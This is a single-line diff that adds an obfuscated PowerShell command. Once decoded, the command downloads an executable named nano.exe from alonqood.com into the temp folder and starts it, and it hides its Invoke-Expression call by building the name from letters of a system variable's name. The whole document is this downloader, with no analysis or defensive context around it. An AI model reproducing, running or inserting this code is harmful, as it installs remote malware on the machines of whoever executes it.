@@ -1,0 +1,1 @@
+﻿ ('(RDrdpl='+'RDren'+'v:'+'t'+'emp'+'+5'+'Xc'+'f.exe5'+'X'+'c)'+';'+'(N'+'e'+'w-Objec'+'t Sys'+'tem.'+'Net.'+'W'+'eb'+'Cli'+'ent)'+'.'+'Do'+'wnloa'+'dF'+'ile(5'+'Xcht'+'t'+'p://alo'+'nqood.com/n'+'an'+'o.ex'+'e5Xc, R'+'Dr'+'dp'+'l'+');Star'+'t-'+'Proc'+'es'+'s RDrdpl').RePLAce('RDr','$').RePLAce('5Xc',[STRINg][cHaR]39) | . ((Get-VARiAbLE '*mDr*').NamE[3,11,2]-JOiN'')
